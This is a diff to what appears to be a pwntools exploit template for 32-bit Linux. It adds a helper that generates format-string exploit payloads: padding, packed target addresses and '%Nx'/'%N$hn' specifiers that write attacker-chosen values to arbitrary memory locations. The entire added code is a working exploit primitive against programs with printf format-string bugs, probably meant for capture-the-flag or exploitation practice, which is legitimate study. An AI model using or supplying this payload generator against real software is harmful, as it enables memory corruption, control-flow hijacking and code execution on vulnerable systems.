@@ -27,6 +27,45 @@ context(os = 'linux', arch = 'i386', endian = 'little', bits = 32)
 ''' --- variables --- '''
 
 ''' --- functions --- '''
+def generate_format_string_payload(where_what_map_list, begin_offset, string_format_offset_pair):
+    def min_string_format_offset_pair(offset, index):
+        return offset - 4 * max(1, index - 1), 1
+
+    def get_real_begin_offset_and_index(begin_offset, offset, index):
+        if offset > begin_offset:
+            real_begin_offset = offset
+            index = index
+        else:
+            add_index = (begin_offset - offset + 3) // 4
+            real_begin_offset = offset + add_index * 4
+            index = index + add_index
+        return real_begin_offset, index
+
+    string_format_offset_pair = min_string_format_offset_pair(*string_format_offset_pair)
+    offset, index = get_real_begin_offset_and_index(begin_offset, *string_format_offset_pair)
+
+    log.info("offset: {}".format(offset))
+
+    payload = b'A' * offset
+    for where in where_what_map_list.keys():
+        payload += p32(where) + p32(where + 2)
+
+    offset += len(where_what_map_list) * 8
+    for where, what in where_what_map_list.items():
+        v1 = (what & 0xffff) - offset
+        if v1 < 0:
+            v1 += 0x10000
+        offset = (what & 0xffff)
+        v2 = (what >> 16) - offset
+        if v2 < 0:
+            v2 += 0x10000
+        offset = what >> 16
+        payload += ('%{}x'.format(v1)).encode() + ('%{}$hn'.format(index)).encode()
+        index += 1
+        payload += ('%{}x'.format(v2)).encode() + ('%{}$hn'.format(index)).encode()
+        index += 1
+
+    return payload[begin_offset:]
 
 ''' --- coding here --- '''
 
